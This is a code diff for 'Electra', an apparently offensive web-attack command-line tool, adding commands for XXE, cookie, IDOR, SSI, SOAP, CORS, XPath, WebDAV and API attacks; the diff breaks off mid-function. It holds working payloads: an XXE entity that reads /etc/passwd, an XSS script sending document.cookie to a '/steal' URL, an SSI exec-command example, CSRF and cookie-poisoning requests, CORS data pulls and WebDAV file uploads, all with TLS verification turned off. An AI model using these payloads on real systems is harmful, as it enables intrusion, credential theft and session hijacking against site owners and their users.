@@ -3,7 +3,8 @@
 import dns.resolver
 import concurrent.futures
 import pymongo.errors
-import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time, poplib, imaplib, vncdotool, pymysql, pymongo, psycopg2, ldap3, ssl, itertools, pyshark, base64, pysip, boto3, re, json, random, pymssql, threading
+import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time, poplib, imaplib, vncdotool, pymysql, pymongo, psycopg2, ldap3, ssl, itertools, pyshark, base64, pysip, boto3, re, json, random, pymssql, threading, urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 #import telnetlib (Deprecated in python 3.13)
 #import ssdeep
 import requests.auth
@@ -31,6 +32,7 @@ from cryptography.hazmat.primitives import padding
 from OpenSSL import crypto
 from concurrent.futures import as_completed
 from tqdm import tqdm
+from zeep import Client
 
 BANNER = """
 ███████╗██╗     ███████╗ ██████╗████████╗██████╗  █████╗ 
@@ -38,7 +40,7 @@ BANNER = """
 █████╗  ██║     █████╗  ██║        ██║   █████╔╝ ███████║
 ██╔══╝  ██║     ██╔══╝  ██║        ██║   ██  ██╗ ██╔══██║
 ███████╗███████╗███████╗╚██████╗   ██║   ██║  ██╗██║  ██║
-═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.6
+═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.7
 
 Electra - The master plan plotter.
 """
@@ -50,7 +52,6 @@ class BannerGroup(click.Group):
     
     def format_commands(self, ctx, formatter):
         commands = [
-            #("cdir", "Create a new directory in a specified path."),
             ("sscan", "Perform a system scan."),
             ("nscan", "Perform a network scan."),
             ("webpass", "Web Dictionary Password Brute Force Attack."),
@@ -83,7 +84,16 @@ class BannerGroup(click.Group):
             ("dnskit", "Generate domain names. Perform DNS queries. Estimate webpage similarity."),
             #("dnskit2", "Similar to dnskit.") Easter egg?
             ("wpscan", "Scan wordpress websites."),
-            ("lfi", "Perform Local File Inclusion vulnerability checks.")
+            ("lfi", "Perform Local File Inclusion vulnerability checks."),
+            ("xxe", "Scan for XXE vulnerabilities."),
+            ("cookie", "Scan for cookie vulnerabilities."),
+            ("idor", "Scan for Insecure Direct Object Reference vulnerability."),
+            ("ssi", "Scan for Server-Side Includes Injection vulnerability."),
+            ("webserv", "Scan for SOAP, WSDL and web services vulnerabilities."),
+            ("cors", "Scan for CORS misconfigurations/vulnerabilities."),
+            ("xpath", "Scan for XPath Injection Vulnerabilities."),
+            ("webdav", "Scan and Exploit WebDAV vulnerabilities."),
+            ("api", "Perform API scanning and exploitation.")
         ]
         with formatter.section("Commands"):
             for cmd, desc in commands:
@@ -95,34 +105,6 @@ class BannerGroup(click.Group):
 @click.option("-h", "--help", is_flag=True, expose_value=False, is_eager=True, callback=lambda ctx, param, value: click.echo(ctx.get_help()) if value else None, help="Show this help message and exit.")
 def cli():
     click.echo(BANNER)
-
-#CDIR COMMAND
-@cli.command()
-@click.option("-n", "--name", default="Directory", prompt="Enter dir name", help="Name of the directory to create. Default name is 'Directory'.")
-@click.option("-p", "--path", default=None, help="Path where the directory should be created. Default is current working directory.")
-def cdir(name, path):
-    #Check whether OS is Linux
-    if os.name != "posix":
-        click.echo(click.style("[~] This function is only supported on Linux systems.", fg="magenta"))
-        return
-    
-    #Set default path
-    if not path:
-        path = os.getcwd()
-        click.echo(click.style(f"[~] No path specified. Using current directory: {path}", fg="magenta"))
-    
-    #Construct the full directory path
-    full_path = os.path.join(path, name)
-
-    try:
-        os.makedirs(full_path, exist_ok=True)
-        click.echo(click.style(f"[!] Dir: '{name}' created successfully at {full_path}", fg="green"))
-    except PermissionError:
-        click.echo(click.style("[!] Error: Permission denied. Try running with elevated privileges.", fg="red"))
-    except FileExistsError:
-        click.echo(click.style("[!] Error: Dir already exists.", fg="red"))
-    except Exception as e:
-        click.echo(click.style(f"[!] Error: {e}", fg="red"))
 
 #SSCAN COMMAND
 @cli.command()
@@ -2127,7 +2109,7 @@ def ssrf(url, param, header, proxy):
     
     click.echo(click.style("\n[*] SSRF scan completed.", fg="blue"))
 
-#DBSCAN COMMAND - PYMSSQL Dependency for requirements.txt
+#DBSCAN COMMAND
 @cli.command()
 @click.option("-t", "--target", required=True, help="Target DB server (IP, Domain or Host).")
 @click.option("-p", "--port", default=None, help="Port of DB server. Default = Auto-Detect")
@@ -2735,7 +2717,7 @@ def wpscan(target, userlist, bf, scan, config, threads, delay):
     if bf:
         wp_bf(target, usernames, config_data["wordlist_path"], config_data["proxy_list"], config_data["user_agents"], config_data["max_threads"], config_data["random_delay_range"])
 
-#LFI COMMAND - New dependencies: threading, tqdm - WARNING: USING -A, CTRL + C NEEDS SOME TIME TO FUNCTION-REGISTER. - Needs work.
+#LFI COMMAND - WARNING: USING -A, CTRL + C NEEDS SOME TIME TO FUNCTION-REGISTER. - Needs work.
 last_request_time = 0
 request_lock = threading.Lock()
 
@@ -2838,6 +2820,634 @@ def scan_lfi(payload, url, headers, delay):
         click.echo(click.style(f"[!] Error: {e}", fg="red"))
     
     #time.sleep(delay) #Intentionally spread thread load a bit more
+
+#XXE COMMAND - UNDER DEVELOPMENT - XXE Directory
+@cli.command()
+@click.option("-u", "--url", required=True, help="Target URL.")
+@click.option("-f", "--file", default="/etc/passwd", help="Remote file to try to read via XXE. Default: /etc/passwd")
+@click.option("-p", "--payload", type=click.Path(exists=True), help="Use custom payload file.")
+@click.option("-a", "--attack", help="Attacker-contolled server (Out-Of-Band attack used in OOB payloads).")
+@click.option("-o", "--output", default=None, nargs=1, required=False, help="Output file for successful detections.")
+def xxe(url, file, payload, attack, output):
+    click.echo(click.style(f"[!] Testing {url} for XXE vulnerabilities ...\n", fg="blue"))
+
+    payloads = []
+
+    if payload:
+        with open(payload, "r") as payload_file:
+            content = payload_file.read()
+            raw_payloads = [p.strip() for p in content.split("---") if p.strip()]
+            for p in raw_payloads:
+                formatted = p.format(file=file, attack=attack)
+                payloads.append(formatted)
+            click.echo(click.style(f"[!] Successfully loaded {len(payloads)} payload(s) from {payload}", fg="green"))
+    else:
+        default_payload = f"""<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "file://{file}">
+]>
+<root>&xxe;</root>
+"""
+        payloads.append(default_payload)
+
+    headers = {
+        "Content-Type": "application/xml"
+    }
+
+    for idx, payload in enumerate(payloads, 1):
+        click.echo(click.style(f"\n[>] Sending payload #{idx} ...", fg="blue"))
+        try:
+            response = requests.post(url, data=payload, headers=headers, timeout=10)
+            if response.status_code == 200:
+                if "root:x" in response.text or "DOCTYPE" in response.text or "xxe" not in response.text:
+                    click.echo(click.style(f"[!] Detected possible XXE vulnerability.", fg="green"))
+                    click.echo(click.style(f"[!] Server responded with:", fg="yellow"))
+                    click.echo(click.style(response.text[:500]))
+
+                    if output is None or output.strip() == "":
+                        output = "./Electra-XXE-Results.txt"
+                        with open(output, "a") as output_file:
+                            output_file.write(f"[+] Payload #{idx} - {url}\n")
+                            output_file.write("Payload:\n")
+                            output_file.write(payload.strip() + "\n")
+                            output_file.write("\nResponse snippet:\n")
+                            output_file.write(response.text[:500].strip() + "\n")
+                            output_file.write("=" * 60 + "\n")
+                    click.echo(click.style(f"[!] Successfully saved detections at {output}.", fg="green"))
+
+                else:
+                    click.echo(click.style(f"[!] No XXE vulnerability detected with this payload.", fg="red"))
+            else:
+                click.echo(click.style(f"[!] Server returned with status code: {response.status_code}", fg="red"))
+        except requests.exceptions.RequestException as e:
+            click.echo(click.style(f"[!] Request failed: {e}", fg="red"))
+
+#COOKIE COMMAND - New dependency: urllib3 and disable SSL warnings globally: urllib3.disable_warnings(urllib3.exception.InsecureRequestWarning) - Cookie directory
+@cli.command()
+@click.option("-u", "--url", required=True, help="Target URL to scan.")
+@click.option("-c", "--cookie", default=None, help="Manually provide a cookie to test (e.g., 'session=electra123').")
+@click.option("-m", "--misfortune", is_flag=True, help="Check for Misfortune (CVE-2014-9222) cookie vulnerability.")
+def cookie(url, cookie, misfortune):
+    click.echo(click.style(f"[*] Initializing cookie vulnerability scan on: {url}", fg="blue"))
+    
+    session = requests.Session()
+    headers = {}
+    cookies = {}
+
+    if cookie:
+        try:
+            cookie_parts = cookie.split(";")
+            for part in cookie_parts:
+                key, value = part.strip().split("=", 1)
+                cookies[key] = value
+            headers["Cookie"] = cookie
+            click.echo(click.style(f"[+] Loaded custom Cookie: {cookies}", fg="yellow"))
+        except Exception:
+            click.echo(click.style(f"[!] Invalid Cookie format. Use: key=value;key2=value2", fg="red"))
+            return
+    
+    try:
+        response = session.get(url, headers=headers, cookies=cookies, verify=False)
+        set_cookie = response.headers.get("Set-Cookie", "")
+
+        if not set_cookie:
+            click.echo(click.style("[!] No 'Set-Cookie' header found.", fg="red"))
+            return
+        
+        baked_cookies = response.cookies
+        click.echo(click.style(f"[+] Server set cookies: {baked_cookies.get_dict()}", fg="yellow"))
+
+        for name in baked_cookies:
+            raw_cookie = [c for c in set_cookie.split(",") if name.name in c][0]
+            click.echo(click.style(f"\n[!] Analyzing cookie: {name}", fg="blue"))
+            exploited = False
+
+            #Secure flag
+            if "Secure" not in raw_cookie:
+                click.echo(click.style(f"\n[!] Cookie '{name}' is missing 'Secure flag'.", fg="green"))
+                click.echo(click.style(f"[~] Initializing MITM Cookie Hijacking via HTTP ...", fg="blue"))
+                try:
+                    hijack_response = requests.get(url.replace("https://", "http://"), verify=False)
+                    if hijack_response.status_code == 200:
+                        click.echo(click.style(f"[!] Cookie intercepted over HTTP.", fg="green"))
+                        exploited = True
+                except Exception as e:
+                    click.echo(click.style(f"[!] Hijacking attempt failed: {e}", fg="red"))
+            
+            #HttpOnly
+            if "HttpOnly" not in raw_cookie:
+                click.echo(click.style(f"\n[!] Cookie '{name}' is missing 'HttpOnly' flag.", fg="green"))
+                click.echo(click.style(f"[~] Initiating XSS Cookie theft via <script> injection.", fg="blue"))
+                payload = "<script>fetch('http://127.0.0.1/steal?c=' + document.cookie)</script>"
+                target_url = f"{url}?q={urllib.parse.quote_plus(payload)}"
+                target_response = session.get(target_url, verify=False)
+                if payload in target_response.text:
+                    click.echo(click.style(f"[!] Injected script found in response.", fg="green"))
+                    exploited = True
+                else:
+                    click.echo(click.style(f"[!] Injected script not found in response. Try another endpoint.", fg="red"))
+            
+            #SameSite
+            if "SameSite" not in raw_cookie:
+                click.echo(click.style(f"\n[!] Cookie '{name}' is missing 'SameSite' flag.", fg="green"))
+                click.echo(click.style(f"[~] Initiating CSRF attack via crafted cross-origin request ...", fg="blue"))
+                try:
+                    csrf_response = session.post(url, data={"csrf": "1"}, headers={"Origin": "http://127.0.0.1"}, verify=False)
+                    if csrf_response.status_code == 200:
+                        click.echo(click.style(f"[!] Target accepted cross-origin POST.", fg="green"))
+                        exploited = True
+                except Exception as e:
+                    click.echo(click.style(f"[!] CSRF attack failed: {e}", fg="red"))
+            
+            #Poisoning
+            click.echo(click.style(f"\n[*] Attempting Cookie Poisoning on '{name}' ...", fg="blue"))
+            poisoned = baked_cookies.get_dict()
+            poisoned[name] = "admin"
+            poison_response = session.get(url, cookies=poisoned, verify=False)
+            if poison_response.status_code == 200 and poison_response.content != response.content:
+                click.echo(click.style(f"[!] Changing cookie value affected response.", fg="green"))
+                exploited = True
+            else:
+                click.echo(click.style(f"[!] Poisoned cookie did not affect response.", fg="red"))
+            
+            if not exploited:
+                click.echo(click.style(f"[!] No vulnerabilities detected for cookie: {name}", fg="red"))
+        
+        #Hijack (Replay stolen cookie)
+        if cookie:
+            click.echo(click.style(f"[*] Attempting cookie replay with provided cookie ...", fg="blue"))
+            replay_response = session.get(url, cookies=cookies, verify=False)
+            if replay_response.status_code == 200:
+                click.echo(click.style(f"[!] Cookie replay successful. Session is reusable.", fg="green"))
+            else:
+                click.echo(click.style(f"[!] Cookie replay failed. Session may be expired or bound to IP/User-Agent.", fg="red"))
+        
+        print()
+        
+        #Misfortune
+        if misfortune:
+            parsed_url = urllib.parse.urlparse(url)
+            host = parsed_url.hostname
+            port = parsed_url.port or 80
+            try:
+                s = socket.socket()
+                s.settimeout(5)
+                s.connect((host, port))
+                s.sendall(b"GET / HTTP/1.1\r\nHost: " + bytes(host, "utf-8") + b"\r\n\r\n")
+                resp = s.recv(4096)
+                if b"RomPager" in resp:
+                    click.echo(click.style(f"[!] RomPager detected! Possible Cookie Misfortune vulnerability.", fg="green"))
+                else:
+                    click.echo(click.style(f"[!] No RomPager detected.", fg="red"))
+                s.close()
+            except Exception as e:
+                click.echo(click.style(f"[!] Cookie Misfortune check failed: {e}", fg="red"))
+        
+        print()
+    
+    except Exception as e:
+        click.echo(click.style(f"[!] Error during cookie analysis: {e}", fg="red"))
+
+#IDOR COMMAND - IDOR directory - Possible merge with api command
+@cli.command()
+@click.option("-u", "--url", required=True, help="Target URL with FUZZ placeholder (e.g., http://127.0.0.1:5000/user?id=FUZZ).")
+@click.option("-r", "--range", "range_values", required=True, help="Range of object IDs to test (e.g., 1-50).")
+@click.option("-m", "--method", default="GET", type=click.Choice(["GET", "POST"], case_sensitive=False), help="HTTP method to use. Default is GET.")
+@click.option("-a", "--auth", default=None, help="Authentication header (e.g., 'Bearer <token>').")
+@click.option("-v", "--verbose", is_flag=True, help="Enable verbose output (show full responses).")
+def idor(url, range_values, method, auth, verbose):
+    click.echo(click.style("[*] Starting IDOR scan ...", fg="blue"))
+    
+    if "FUZZ" not in url:
+        click.echo(click.style("[!] Error: URL must contain the 'FUZZ' placeholder.", fg="red"))
+        return
+    
+    try:
+        start, end = map(int, range_values.split("-"))
+        if start > end:
+            raise ValueError
+    except ValueError:
+        click.echo(click.style("[!] Error: Invalid range format. Use format like 1-100.", fg="red"))
+        return
+    
+    headers = {}
+    if auth:
+        headers["Authorization"] = auth
+    
+    for i in tqdm(range(start, end + 1), desc="\nTesting IDs", unit="req"):
+        target = url.replace("FUZZ", str(i))
+        try:
+            if method.upper() == "GET":
+                resp = requests.get(target, headers=headers, verify=False, timeout=5)
+            else:
+                data = { "id": str(i) }
+                resp = requests.post(url.split("?")[0], headers=headers, data=data, verify=False, timeout=5)
+            
+            #Detect responses
+            if resp.status_code == 200 and len(resp.text) > 1: #100
+                click.echo(click.style(f"[!] Possible IDOR at ID {i} | Status: {resp.status_code}", fg="green"))
+                if verbose:
+                    click.echo(resp.text[:300])
+            elif resp.status_code in [401, 403]:
+                click.echo(click.style(f"[!] No IDOR at ID {i} | Status: {resp.status_code}", fg="red"))
+            else:
+                if verbose:
+                    click.echo(f"[!] ID {i} | Status: {resp.status_code}")
+        
+        except requests.RequestException as e:
+            click.echo(click.style(f"[!] Request failed at ID {i}: {e}", fg="red"))
+    
+    click.echo(click.style("\n[*] IDOR scan completed.", fg="blue"))
+
+#SSI COMMAND - ssi directory - SecFlaskSSI.py adds a new dependency: markupsafe - Possible merge with other command
+@cli.command()
+@click.option("-u", "--url", required=True, help="Target URL.")
+@click.option("-p", "--param", required=True, help="Vulnerable parameter to inject SSI payloads.")
+@click.option("-m", "--method", type=click.Choice(["GET", "POST"], case_sensitive=False), default="GET", help="HTTP method to use. Default is GET.")
+@click.option("-P", "--payload", default='<!--#echo var="HTTP_USER_AGENT" -->', help="Default SSI payload (Use it if you dont have a custom payload file or insert your payload e.g., '<!--#exec cmd='ls' -->').")
+@click.option("-Pf", "--payload-file", type=click.Path(exists=True), help="Path to custom payload file (Use it if you dont want to use the default payload).")
+@click.option("-v", "--verbose", is_flag=True, help="Enable verbosity.")
+def ssi(url, param, method, payload, payload_file, verbose):
+    click.echo(click.style(f"[*] Initiating SSI Injection scan on: {url} ...", fg="blue"))
+
+    payloads = []
+    if payload_file:
+        try:
+            with open(payload_file, "r", encoding="utf-8") as pf:
+                payloads = [line.strip() for line in pf if line.strip()]
+                click.echo(click.style(f"\n[+] Loaded {len(payloads)} payloads from file.", fg="yellow"))
+        except Exception as e:
+            click.echo(click.style(f"[!] Failed to read payload file: {e}", fg="red"))
+            return
+    else:
+        payloads = [payload]
+        click.echo(click.style(f"\n[+-] Using DEFAULT payload (-P).", fg="yellow"))
+    
+    #Attack with payloads
+    for idx, pl in enumerate(payloads, 1):
+        click.echo(click.style(f"\n[>] Testing payload {idx}: {pl}", fg="blue"))
+        injection = {param: pl}
+        try:
+            if method.upper() == "GET":
+                response = requests.get(url, params=injection, verify=False, timeout=10)
+            else:
+                response = requests.post(url, data=injection, verify=False, timeout=10)
+            
+            if verbose:
+                click.echo(click.style(f"[V] Response code: {response.status_code}", fg="bright_blue"))
+                click.echo(click.style(f"[V] Response body snippet:\n{response.text[:500]}", fg="bright_blue"))
+                print()
+            
+            #Heuristic checks
+            if pl in response.text:
+                click.echo(click.style(f"[!] SSI Injection vulnerability detected. Payload echoed in response.", fg="green"))
+            elif any(x in response.text.lower() for x in ["uid=", "gid=", "/bin", "/usr", "root:x:"]):
+                click.echo(click.style(f"[!] SSI Injection vulnerability detected. ", fg="green"))
+            else:
+                click.echo(click.style(f"[!] No SSI Injection vulnerability detected.", fg="red"))
+        
+        except Exception as e:
+            click.echo(click.style(f"[!] Request failed: {e}", fg="red"))
+    
+    click.echo(click.style("\n[*] SSI Injection scan completed.", fg="blue"))
+
+#WEBSERV COMMAND - New dependency: zeep - webserv directory - NEEDS WORK - Possible merge with api command
+@cli.command()
+@click.option("-u", "--url", required=True, help="Target URL (to the SOAP endpoint or WSDL file).")
+@click.option("-x", "--xxe", is_flag=True, help="Test for XXE vulnerability.")
+@click.option("-i", "--info", is_flag=True, help="Print available operations and bindings from the WSDL.")
+def webserv(url, xxe, info):
+    click.echo(click.style(f"[*] Starting SOAP/WSDL scan on: {url}", fg="blue"))
+
+    try:
+        response = requests.get(url, verify=False, timeout=10)
+        if response.status_code != 200:
+            click.echo(click.style(f"\n[!] Unable to fetch WSDL: HTTP {response.status_code}", fg="red"))
+            return
+        
+        #Check if WSDL is valid
+        if "definitions" in response.text or "?wsdl" in url.lower():
+            click.echo(click.style("\n[!] WSDL detected.", fg="yellow"))
+        else:
+            click.echo(click.style("\n[!] No WSDL detected. Quitting ...", fg="red"))
+        
+        if info:
+            try:
+                client = Client(url)
+                click.echo(click.style(f"\n[@] Available services & methods:", fg="white"))
+                for service in client.wsdl.services.values():
+                    for port in service.ports.values():
+                        click.echo(click.style(f"Service: {service.name}, Port: {port.name}", fg="white"))
+                        operations = port.binding._operations
+                        for op in operations:
+                            click.echo(click.style(f"Operation: {op}", fg="white"))
+            except Exception as e:
+                click.echo(click.style(f"[!] Zeep parsing failed: {e}", fg="red"))
+        
+        if xxe:
+            click.echo(click.style(f"\n[*] Testing for XXE vulnerability ...", fg="blue"))
+            xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+   <soap:Body>
+      <getXXE>
+         <data>&xxe;</data>
+      </getXXE>
+   </soap:Body>
+</soap:Envelope>
+"""
+        headers = {
+            "Content-Type": "text/xml",
+            "SOAPAction": ""
+        }
+
+        xxe_response = requests.post(url, data=xxe_payload, headers=headers, verify=False, timeout=10)
+        if "root:" in xxe_response.text:
+            click.echo(click.style(f"\n[!] XXE vulnerability detected.", fg="green"))
+        else:
+            click.echo(click.style(f"\n[!] No XXE vulnerability detected.", fg="red"))
+    
+    except requests.exceptions.RequestException as e:
+        click.echo(click.style(f"[!] Request failed: {e}", fg="red"))
+
+#CORS COMMAND - cors directory - Possible merge with api command
+@cli.command()
+@click.option("-u", "--url", required=True, help="Target base URL.")
+@click.option("-o", "--origin", default="http://127.0.0.1", help="Origin URL for attacking. Default: http://127.0.0.1")
+@click.option("-e", "--endpoints", default="/api,/id,/user,/users", help="Comma-seperated list of endpoints to attack.")
+@click.option("-ac", "--auth-cookie", default=None, help="Session cookie to use (e.g., 'electraid=electra123').")
+def cors(url, origin, endpoints, auth_cookie):
+    click.echo(click.style(f"[*] Scanning for CORS misconfigurations/vulnerabilities ...", fg="blue"))
+
+    headers = {
+        "Origin": origin,
+        "User-Agent": "Mozilla/5.0 (Electra CORS)",
+    }
+    if auth_cookie:
+        headers["Cookie"] = auth_cookie
+    
+    try:
+        response = requests.get(url, headers=headers, verify=False, timeout=10)
+        acao = response.headers.get("Access-Control-Allow-Origin")
+        acac = response.headers.get("Access-Control-Allow-Credentials")
+
+        if not acao:
+            click.echo(click.style(f"\n[!] No CORS headers found.", fg="red"))
+            return
+        
+        click.echo(click.style(f"\n[@] Access-Control-Allow-Origin: {acao}", fg="yellow"))
+
+        if acac:
+            click.echo(click.style(f"[@] Access-Control-Allow-Credentials: {acac}", fg="yellow"))
+
+        vulnerable = False
+        if acao == "*" and acac == "true":
+            click.echo(click.style(f"\n[!] HIGHLY EXPLOITABLE | Detected vulnerabilities: Wildcard Origin + Credentials.", fg="bright_green"))
+            vulnerable = True
+        elif acao == origin and acac == "true":
+            click.echo(click.style(f"\n[!] HIGHLY EXPLOITABLE | Detected vulnerability: Reflected origin with credentials.", fg="bright_green"))
+            vulnerable = True
+        elif acao == "*":
+            click.echo(click.style(f"\n[!] LESS EXPLOITABLE | Detected vulnerability: Wildcard Origin.", fg="bright_magenta"))
+        
+        if not vulnerable:
+            click.echo(click.style(f"\n[!] NOT EXPLOITABLE | Did not detect vulnerabilities. CORS is either strict or not vulnerable.", fg="bright_red"))
+            return
+        
+        #Exploitation
+        click.echo(click.style(f"\n[*] Attempting exploitation ...", fg="blue"))
+        target_endpoints = [ep.strip() for ep in endpoints.split(",")]
+        for ep in target_endpoints:
+            full_url = urllib.parse.urljoin(url, ep)
+            try:
+                exfil_headers = headers.copy()
+                exploit_response = requests.get(full_url, headers=exfil_headers, verify=False, timeout=10)
+                click.echo(click.style(f"\n[>] Tested Endpoint: {full_url}", fg="blue"))
+                click.echo(click.style(f"Status Code: {exploit_response.status_code}", fg="blue"))
+
+                content_type = exploit_response.headers.get("Content-Type", "")
+                if "application/json" in content_type or "text" in content_type:
+                    preview = exploit_response.text[:500]
+                    click.echo(click.style(f"Data:\n{preview}", fg="blue"))
+                else:
+                    click.echo(click.style(f"[!] Non-text response or binary data.", fg="yellow"))
+            except Exception as e:
+                click.echo(click.style(f"[!] Failed to exploit {ep}: {e}", fg="red"))
+        
+        click.echo(click.style(f"[*] CORS scan completed.", fg="blue"))
+
+    except requests.exceptions.RequestException as e:
+        click.echo(click.style(f"[!] CORS request failed: {e}", fg="red"))
+
+#XPATH COMMAND - xpath directory - Possible merge with other command.
+@cli.command()
+@click.option("-u", "--url", required=True, help="Target URL.")
+@click.option("-p", "--param", required=True, help="Parameter name for the injection (e.g., users).")
+@click.option("-m", "--method", default="GET", type=click.Choice(["GET", "POST"], case_sensitive=False), help="HTTP method to use.")
+@click.option("-d", "--data", help="Additional data for POST requests (e.g., password=electra123).")
+@click.option("-c", "--cookie", help="Cookie value to send with the request.")
+@click.option("-h", "--header", multiple=True, help="Use custom headers (Format: Key:Value).")
+@click.option("-P", "--payload", type=click.Path(exists=False), help="Use custom payload file (Default: xpath_payloads.txt).")
+def xpath(url, param, method, data, cookie, header, payload):
+    def_payl_file = os.path.join("xpath", "xpath_payloads.txt")
+    payload_file = payload if payload else def_payl_file
+    click.echo(click.style(f"[*] Initiating XPath Injection vulnerability scanning ...", fg="blue"))
+
+    try:
+        with open(payload_file, "r", encoding="utf-8") as pf:
+            payload_list = [line.strip() for line in pf if line.strip()]
+        click.echo(click.style(f"\n[*] Loaded {len(payload_list)} payloads from {payload_file}\n", fg="blue"))
+    except FileNotFoundError:
+        click.echo(click.style(f"\n[!] Payload file not found: {payload_file}", fg="red"))
+        return
+    except Exception as e:
+        click.echo(click.style(f"\n[!] Error reading payload file: {e}", fg="red"))
+        return
+    
+    headers = {}
+    if cookie:
+        headers["Cookie"] = cookie
+    if header:
+        for h in header:
+            try:
+                key, value = h.split(":", 1)
+                headers[key.strip()] = value.strip()
+            except:
+                click.echo(click.style(f"[!] Invalid header format: {h}", fg="red"))
+    
+    vulnerable = False
+    for payload in payload_list:
+        if method.upper() == "GET":
+            params = {param: payload}
+            full_url = f"{url}?{urllib.parse.urlencode(params)}"
+            try:
+                request = requests.get(full_url, headers=headers, verify=False, timeout=10)
+            except Exception as e:
+                click.echo(click.style(f"[!] Error during GET request: {e}", fg="red"))
+                continue
+        elif method.upper() == "POST":
+            post_data = {param: payload}
+            if data:
+                for d in data.split("&"):
+                    if "=" in d:
+                        key, value = d.split("=", 1)
+                        post_data[key] = value
+            try:
+                request = requests.post(url, data=post_data, headers=headers, verify=False, timeout=10)
+            except Exception as e:
+                click.echo(click.style(f"[!] Error during POST request: {e}", fg="red"))
+                continue
+        
+        if any(ind in request.text.lower() for ind in ["xpath", "xml", "node", "syntax", "query", "invalid"]):
+            click.echo(click.style(f"[!] Detected XPath Injection vulnerability with payload: {payload}", fg="green"))
+            vulnerable = True
+        elif request.status_code in [400, 500]:
+            click.echo(click.style(f"[!] Returned status code: {request.status_code} using payload: {payload}", fg="yellow"))
+            vulnerable = True
+        else:
+            click.echo(click.style(f"[!] No XPath Injection vulnerability detected using payload: {payload}", fg="red"))
+    
+    if vulnerable:
+        click.echo(click.style(f"\n[!] XPath Injection vulnerability detected.", fg="green"))
+    else:
+        click.echo(click.style(f"\n[!] No XPath Injection vulnerability detected.", fg="red"))
+
+    click.echo(click.style(f"\n[*] XPath Injection vulnerability scan completed.", fg="blue"))
+
+#WEBDAV COMMAND - webdav directory - Should one day, maybe get merged to another command but I kinda want is as a stand-alone
+@cli.command()
+@click.option("-u", "--url", required=True, help="Target WebDAV URL.")
+@click.option("-U", "--username", default=None, help="Username for Basic Auth.")
+@click.option("-P", "--password", default=None, help="Password for Basic Auth.")
+@click.option("-e", "--exploit", is_flag=True, help="Attempt exploitation (file upload).")
+def webdav(url, username, password, exploit):
+    click.echo(click.style(f"[*] Starting WebDAV scan on: {url} ...", fg="blue"))
+
+    headers = {"User-Agent": "Electra-WebDAV-Scanner"}
+    auth = (username, password) if username and password else None
+
+    def check_options():
+        try:
+            r = requests.options(url, auth=auth, headers=headers, verify=False)
+            methods = r.headers.get("Allow", "")
+            dav = r.headers.get("DAV", "")
+            click.echo(click.style(f"\n[@] Allowed Methods: {methods}", fg="yellow"))
+            if "PROPFIND" in methods or "OPTIONS" in methods:
+                click.echo(click.style(f"\n[!] WebDAV seems enabled (DAV Header: {dav}).", fg="green"))
+                return True
+            else:
+                click.echo(click.style(f"\n[!] No WebDAV methods found. Target may not support WebDAV.", fg="red"))
+                return False
+        except Exception as e:
+            click.echo(click.style(f"\n[!] Error during OPTIONS request: {e}", fg="red"))
+            return False
+    
+    def propfind_req():
+        xml_body = '''<?xml version="1.0"?>
+<D:propfind xmlns:D="DAV:">
+    <D:allprop/>
+</D:propfind>
+'''
+        try:
+            r = requests.request("PROPFIND", url, data=xml_body, headers=headers, auth=auth, verify=False, timeout=10)
+            if r.status_code in [207, 200]:
+                click.echo(click.style("\n[!] PROPFIND successful. Accessible resources:", fg="green"))
+                tree = ET.fromstring(r.text)
+                for resp in tree.findall(".//{DAV:}href"):
+                    click.echo(click.style(f"{resp.text}", fg="white"))
+            else:
+                click.echo(click.style(f"\n[!] PROPFIND failed. Status: {r.status_code}", fg="red"))
+
+        except Exception as e:
+            click.echo(click.style(f"\n[!] Error during PROPFIND request: {e}", fg="red"))
+    
+    def upload_exploit():
+        try:
+            filename = "electra_upl_exp.txt"
+            full_path = urllib.parse.urljoin(url, filename)
+            r = requests.put(full_path, data="Electra WebDAV Upload Exploit", auth=auth, headers=headers, verify=False)
+            if r.status_code in [200, 201, 204]:
+                click.echo(click.style(f"\n[!] Successful upload: {full_path}. Target is vulnerable.", fg="green"))
+            elif r.status_code == 403:
+                click.echo(click.style(f"\n[!] Forbidden upload (403). Target is not vulnerable.", fg="red"))
+            else:
+                click.echo(click.style(f"\n[!] Upload failed. Status code: {r.status_code}. Target is not vulnerable.", fg="red"))
+        except Exception as e:
+            click.echo(click.style(f"\n[!] Error during file upload: {e}", fg="red"))
+    
+    if check_options():
+        propfind_req()
+        if exploit:
+            upload_exploit()
+    
+    click.echo(click.style(f"\n[*] WebDAV scan completed.", fg="blue"))
+
+#API COMMAND - Needs work (fuzzing and exploitation are just a test for now, improve them)
+@cli.command()
+@click.option("-u", "--url", required=True, help="Target API URL.")
+@click.option("-t", "--token", default=None, help="Bearer token for authentication.")
+@click.option("-f", "--fuzz", is_flag=True, help="Enable fuzzing on detected endpoints.")
+@click.option("-x", "--exploit", is_flag=True, help="Enable exploitation for found vulnerabilities.")
+def api(url, token, fuzz, exploit):
+    click.echo(click.style(f"[*] Starting API vulnerability scan on: {url} ...", fg="blue"))
+
+    headers = {"User-Agent": "Electra-Scanner"}
+    if token:
+        headers["Authorization"] = f"Bearer {token}"
+    
+    try:
+        response = requests.options(url, headers=headers, verify=False, timeout=10)
+        neutral_methods = response.headers.get("Allow", "GET, POST, OPTIONS")
+        click.echo(click.style(f"[@] Neutral HTTP Methods: {neutral_methods}", fg="yellow"))
+        important_methods = {"PUT", "DELETE", "TRACE", "CONNECT"}
+        important = [method for method in neutral_methods.split(", ") if method in important_methods]
+        if important:
+            click.echo(click.style(f"[!] Detected important HTTP methods: {', '.join(important)}", fg="yellow"))
+        
+        cors_response = requests.get(url, headers={**headers, "Origin": "127.0.0.1"}, verify=False, timeout=10)
+        if "Access-Control-Allow-Origin" in cors_response.headers and cors_response.headers["Access-Control-Allow-Origin"] == "*":
+            click.echo(click.style(f"[!] Detected misconfigured CORS (Access-Control-Allow-Origin: *)", fg="green"))
+        
